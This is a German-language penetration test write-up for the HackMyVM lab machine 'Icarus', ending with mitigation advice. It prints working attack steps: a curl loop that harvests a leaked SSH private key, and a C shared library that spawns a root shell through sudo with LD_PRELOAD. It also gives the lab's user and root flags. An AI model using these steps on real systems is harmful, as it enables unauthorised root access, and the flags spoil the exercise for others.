# Icarus (HackMyVM) - Penetration Test Bericht

![Icarus.png](Icarus.png)

**Datum des Berichts:** 12. November 2022  
**VM:** Icarus  
**Plattform:** HackMyVM [https://hackmyvm.eu/machines/machine.php?vm=Icarus](https://hackmyvm.eu/machines/machine.php?vm=Icarus)  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Icarus_HackMyVM_Medium/](https://alientec1908.github.io/Icarus_HackMyVM_Medium/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Web Enumeration & Initial Access (SSH Key Disclosure)](#phase-2-web-enumeration--initial-access-ssh-key-disclosure)
5.  [Phase 3: Privilege Escalation (Sudo & LD_PRELOAD)](#phase-3-privilege-escalation-sudo--ld_preload)
6.  [Proof of Concept (Root Access via LD_PRELOAD)](#proof-of-concept-root-access-via-ld_preload)
7.  [Flags](#flags)
8.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert die Kompromittierung der virtuellen Maschine "Icarus" von HackMyVM (Schwierigkeitsgrad: Medium). Die initiale Erkundung offenbarte offene SSH- und HTTP-Dienste (nginx). Die Web-Enumeration führte zur Entdeckung des Pfades `/a`, der eine Liste weiterer Pfade enthielt. Durch das Abrufen dieser Pfade wurde ein privater SSH-Schlüssel für den Benutzer `icarus` aufgedeckt. Dieser Schlüssel war nicht passwortgeschützt und ermöglichte den direkten SSH-Zugriff als `icarus`.

Die Privilegieneskalation zu Root-Rechten erfolgte durch Ausnutzung einer unsicheren `sudo`-Konfiguration. Der Benutzer `icarus` durfte den Befehl `/usr/bin/id` als jeder Benutzer ohne Passwort ausführen. Entscheidend war jedoch die `sudoers`-Einstellung `env_keep+=LD_PRELOAD`, die es erlaubte, die `LD_PRELOAD`-Umgebungsvariable beim Ausführen von `sudo`-Befehlen beizubehalten. Durch Erstellen einer benutzerdefinierten Shared Library (`.so`-Datei), die beim Laden eine Root-Shell startet, und anschließender Ausführung von `sudo LD_PRELOAD=/pfad/zur/library.so /usr/bin/id` konnte Root-Zugriff erlangt werden.

---

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `nikto`
*   `curl`
*   `ssh-keygen`
*   `ssh`
*   `nano` (oder anderer Texteditor)
*   `gcc` (GNU Compiler Collection)
*   `cat`, `ls`, `cd` (Standard Shell-Befehle)
*   `sudo`

---

## Phase 1: Reconnaissance

1.  **Netzwerk-Scan:**
    *   `arp-scan -l` identifizierte das Ziel `192.168.2.111` (VirtualBox VM).

2.  **Port-Scan (Nmap):**
    *   Ein umfassender `nmap`-Scan (`nmap -sS -sC -T5 -A 192.168.2.111 -p-`) offenbarte:
        *   **Port 22 (SSH):** OpenSSH 7.9p1 Debian
        *   **Port 80 (HTTP):** nginx 1.14.2 (Seitentitel: "LOGIN", Hostname: `icarus`)

---

## Phase 2: Web Enumeration & Initial Access (SSH Key Disclosure)

1.  **Verzeichnis-Enumeration (Gobuster & Nikto):**
    *   `gobuster dir -u http://192.168.2.111 [...]` fand u.a. die Pfade `/a`, `/xml`, `/xxx`, `index.php`, `login.php`, `check.php`. Die Datei `/a` hatte eine auffällig große Größe.
    *   `nikto` wies auf fehlende Sicherheitsheader und ein PHPSESSID-Cookie ohne HttpOnly-Flag hin.

2.  **Information Disclosure über Webpfad `/a`:**
    *   Der Inhalt von `http://192.168.2.111/a` wurde mit `curl` heruntergeladen (`curl "http://192.168.2.111/a" > url`).
    *   Die Datei `url` enthielt eine Liste von Pfaden/Dateinamen.
    *   Eine `for`-Schleife wurde verwendet, um alle in `url` gelisteten Ressourcen vom Server herunterzuladen und in `curl.output` zu aggregieren:
        ```bash
        for i in $(cat url); do curl "http://192.168.2.111/$i" >> curl.output; done
        ```
    *   Die Datei `curl.output` enthielt einen privaten OpenSSH-Schlüssel. Der Kommentar im Schlüssel (`icarus@icarus`) identifizierte den zugehörigen Benutzer als `icarus`.

3.  **SSH-Login als `icarus`:**
    *   Der gefundene private Schlüssel wurde lokal als `icarsa` gespeichert und die Berechtigungen auf `600` gesetzt.
    *   Der öffentliche Schlüssel und der Benutzername wurden mit `ssh-keygen -y -f icarsa` bestätigt.
    *   Der SSH-Login als `icarus` mit dem Schlüssel war erfolgreich:
        ```bash
        ssh -i icarsa icarus@icarus
        ```
    *   Initialer Zugriff als `icarus` wurde erlangt.
    *   Die User-Flag `Dontgotothesun` wurde in `/home/icarus/user.txt` gefunden.

---

## Phase 3: Privilege Escalation (Sudo & LD_PRELOAD)

1.  **Sudo-Rechte-Prüfung für `icarus`:**
    *   `icarus@icarus:~$ sudo -l` zeigte:
        ```
        Matching Defaults entries for icarus on icarus:
            env_reset, mail_badpass, env_keep+=LD_PRELOAD,
            secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

        User icarus may run the following commands on icarus:
            (ALL : ALL) NOPASSWD: /usr/bin/id
        ```
    *   **Kritische Fehlkonfiguration:** Die Option `env_keep+=LD_PRELOAD` erlaubt die Beibehaltung der `LD_PRELOAD`-Umgebungsvariable bei der Ausführung von `sudo`-Befehlen.

2.  **Erstellung der bösartigen Shared Library:**
    *   Im Verzeichnis `/tmp` wurde eine C-Datei (`shell.c`) erstellt:
        ```c
        #include <stdio.h>
        #include <stdlib.h>
        #include <unistd.h> // Notwendig für setuid/setgid

        void _init() {
            unsetenv("LD_PRELOAD");
            setgid(0);
            setuid(0);
            system("/bin/sh");
        }
        ```
    *   Diese Datei wurde als Shared Library kompiliert:
        ```bash
        gcc -fPIC -shared -o shell.so shell.c -nostartfiles
        ```

3.  **Ausnutzung von `LD_PRELOAD`:**
    *   Der `sudo`-Befehl wurde mit gesetzter `LD_PRELOAD`-Variable ausgeführt, die auf die kompilierte `shell.so` zeigte:
        ```bash
        sudo LD_PRELOAD=/tmp/shell.so /usr/bin/id
        ```
    *   Die `_init`-Funktion in `shell.so` wurde mit Root-Rechten ausgeführt, wodurch eine Root-Shell gestartet wurde.

---

## Proof of Concept (Root Access via LD_PRELOAD)

**Kurzbeschreibung:** Die Privilegieneskalation nutzte eine unsichere `sudoers`-Konfiguration (`env_keep+=LD_PRELOAD`) aus. Eine benutzerdefinierte Shared Library wurde erstellt, die beim Laden (`_init`-Funktion) die Benutzer-ID auf Root setzt und eine Shell startet. Durch Setzen der `LD_PRELOAD`-Umgebungsvariable auf den Pfad dieser Library und Ausführen eines beliebigen `sudo`-Befehls (hier `/usr/bin/id`), der `LD_PRELOAD` beibehält, wurde die bösartige Library mit Root-Rechten geladen und ausgeführt.

**Schritte (als `icarus`):**
1.  Wechsle in ein beschreibbares Verzeichnis (z.B. `/tmp`).
2.  Erstelle die C-Quelldatei `shell.c` (siehe oben).
3.  Kompiliere `shell.c` zu einer Shared Library `shell.so`:
    ```bash
    gcc -fPIC -shared -o shell.so shell.c -nostartfiles
    ```
4.  Führe den `sudo`-Befehl mit `LD_PRELOAD` aus:
    ```bash
    sudo LD_PRELOAD=/tmp/shell.so /usr/bin/id
    ```
**Ergebnis:** Eine Shell mit `uid=0(root)` wird gestartet.

---

## Flags

*   **User Flag (`/home/icarus/user.txt`):**
    ```
    Dontgotothesun
    ```
*   **Root Flag (`/root/root.txt`):**
    ```
    RIPicarus
    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **Webserver-Sicherheit:**
    *   **Entfernen Sie private SSH-Schlüssel und andere sensible Informationen von allen über das Web zugänglichen Pfaden.** Überprüfen Sie Webserver-Konfigurationen und Dateiberechtigungen sorgfältig.
    *   Implementieren Sie empfohlene Sicherheitsheader (X-Frame-Options, X-Content-Type-Options, Content-Security-Policy).
    *   Stellen Sie sicher, dass Session-Cookies mit dem `HttpOnly`-Flag gesetzt werden.
*   **SSH-Schlüssel-Management:**
    *   Private SSH-Schlüssel sollten niemals ungeschützt zugänglich sein.
    *   Verwenden Sie starke Passphrasen für alle privaten SSH-Schlüssel.
    *   Im Falle einer Kompromittierung müssen SSH-Schlüssel umgehend widerrufen und neue, sichere Schlüssel generiert werden.
*   **Sudo-Konfiguration:**
    *   **DRINGEND:** Entfernen Sie die Option `env_keep+=LD_PRELOAD` (und ähnliche gefährliche Variablen wie `LD_LIBRARY_PATH`) aus den `Defaults`-Einstellungen oder benutzerspezifischen `sudoers`-Regeln.
    *   Erlauben Sie nur explizit benötigte Umgebungsvariablen über `env_keep`.
    *   Gewähren Sie `sudo`-Rechte nach dem Prinzip der geringsten Rechte. Die Erlaubnis, `/usr/bin/id` als Root auszuführen, war hier nur in Kombination mit der `LD_PRELOAD`-Schwachstelle problematisch.
*   **Systemhärtung:**
    *   Mounten Sie `/tmp` mit Optionen wie `noexec` und `nosuid`, um die Ausführung von Binärdateien oder das Setzen von SUID-Bits in diesem Verzeichnis zu verhindern.
    *   Entfernen Sie unnötige Entwicklungswerkzeuge (wie `gcc`) von Produktivsystemen.
*   **Allgemeine Sicherheitspraktiken:**
    *   Führen Sie regelmäßige Sicherheitsaudits und Schwachstellenscans durch.
    *   Überwachen Sie Systemlogs auf verdächtige Aktivitäten.

---

**Ben C. - Cyber Security Reports**
